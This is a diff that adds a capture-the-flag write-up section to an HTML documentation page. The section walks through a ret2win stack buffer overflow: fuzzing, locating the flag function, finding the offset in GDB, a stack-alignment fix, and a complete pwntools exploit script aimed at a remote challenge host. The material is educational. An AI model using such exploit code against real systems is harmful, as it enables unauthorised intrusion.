@@ -544,6 +544,17 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#4-bof-buffer-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. BOF (Buffer Overflow)
+      
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -665,6 +676,17 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#4-bof-buffer-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. BOF (Buffer Overflow)
+      
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -755,6 +777,41 @@ objdump -d -M intel main.x-sharedlib</code></p>
 </li>
 </ol>
 <p><strong>Flag:</strong> <code>flag{l33t_m3...}</code></p>
+<h2 id="4-bof-buffer-overflow">4. BOF (Buffer Overflow)</h2>
+<p><strong>Target:</strong> Linux Executable (<code>bof.x-executable</code>) &amp; Remote Service
+<strong>Vulnerability:</strong> Stack Buffer Overflow (Ret2Win)</p>
+<p><strong>Solution:</strong>
+The challenge provided a binary and a netcat instance.
+1.  <strong>Initial Fuzzing:</strong> tried sending a long string (<code>python3 -c "print('A' * 100)" | nc ...</code>) to crash the service. The connection closed immediately, suggesting a crash.
+2.  <strong>Static Analysis:</strong> I needed a target address to jump to. I used <code>nm</code> to look for interesting functions:
+    <code>bash
+    nm bof.x-executable | grep -i "flag"</code>
+    Result: <code>0000000000400767 T flag</code>. This is the address of the function that prints the flag.
+3.  <strong>Dynamic Analysis (Finding Offset):</strong>
+    - Started the binary in <strong>GDB</strong>: <code>gdb ./bof.x-executable</code>.
+    - Generated a cyclic pattern using a Python script to identify the exact crash point.
+    - Crashed the app and inspected the <strong>RSP</strong> register: <code>0x6264616161646161</code>.
+    - Calculated the offset by finding the position of that hex value in the pattern.
+    - <strong>Offset found:</strong> 312.
+4.  <strong>Exploitation:</strong>
+    I wrote a Python script using <code>pwntools</code> to send 312 'A's followed by the address of the <code>flag</code> function (<code>0x400767</code>).
+5.  <strong>The Stack Alignment Issue:</strong>
+    The initial exploit failed (EOF). I realized this was due to the <strong>Stack Alignment</strong> rule (System V AMD64 ABI requires 16-byte alignment when calling functions like <code>printf</code>). Jumping to the start of the function (<code>push rbp</code>) misaligned the stack.
+    * <strong>Fix:</strong> I added <code>+1</code> to the target address (<code>0x400768</code>) to skip the function prologue (<code>push rbp</code>). This kept the stack aligned.</p>
+<p><strong>Exploit Code:</strong>
+```python
+from pwn import *</p>
+<p>target_host = "34.40.9.88"
+target_port = 32659
+offset = 312</p>
+<h1 id="skip-prologue-for-stack-alignment-1">Skip prologue for stack alignment (+1)</h1>
+<p>flag_function_addr = 0x400767 + 1 </p>
+<p>conn = remote(target_host, target_port)</p>
+<p>payload = b"A" * offset
+payload += p64(flag_function_addr)</p>
+<p>print(conn.recv())
+conn.sendline(payload)
+print(conn.recvall().decode())</p>
 
 
 
